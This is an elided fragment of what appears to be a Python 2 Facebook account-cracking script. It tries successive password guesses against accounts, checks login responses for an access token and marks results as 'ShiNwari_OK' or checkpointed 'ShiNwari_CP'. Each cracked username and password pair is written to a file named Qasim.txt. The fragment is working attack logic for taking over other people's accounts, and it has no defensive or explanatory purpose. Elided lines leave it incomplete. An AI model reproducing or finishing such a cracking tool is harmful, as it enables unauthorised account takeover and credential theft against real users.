                ...
                if 'access_token' in q:
                    ...
                    if 'access_token' in q:
                        ...
                        if 'access_token' in q:
                            ...
                            print ' \x1b[1;91m(ShiNwari_CP) ' + k + c + user + ' | ' + pass4
                            cps = open('Qasim.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m(ShiNwari_OK) ' + k + c + user + ' | ' + pass5
                                okb = open('Qasim.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;91m(ShiNwari_CP) ' + k + c + user + ' | ' + pass5
                                cps = open('Qasim.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m(ShiNwari_OK) ' + k + c + user + ' | ' + pass6
                                okb = open('Qasim.txt', 'a')
